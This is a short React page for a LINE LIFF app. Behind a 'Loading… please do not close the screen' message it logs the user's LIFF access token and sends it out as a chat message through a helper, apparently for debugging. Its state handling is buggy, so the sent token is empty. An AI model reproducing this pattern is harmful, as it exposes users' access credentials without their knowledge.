import { useState, useEffect } from "react";
import { getLiffId } from "@/utils/getLiffId";
import { liff } from "@line/liff";
import { sendLiffMessage } from "@/utils/sendMessage";

export default function Home() {
  const [liffId, setLiffId] = useState(getLiffId());
  const [liffObj, setLiffObj] = useState<any>({});
  const [token, setToken] = useState("");

  useEffect(() => {
    liff.init({ liffId: liffId }).then(() => {
      setLiffObj(liff);
      console.log("Patch!");
      console.log(liff);
      setToken(liff.getAccessToken() || "");
      console.log(token);

      sendLiffMessage(token, [
        {
          type: "text",
          text: "== Token ==",
        },
        {
          type: "text",
          text: token,
        },
      ]);
    });
  }, []);

  return (
    <>
      <p>Loading... (画面を閉じないで下さい。)</p>
    </>
  );
}
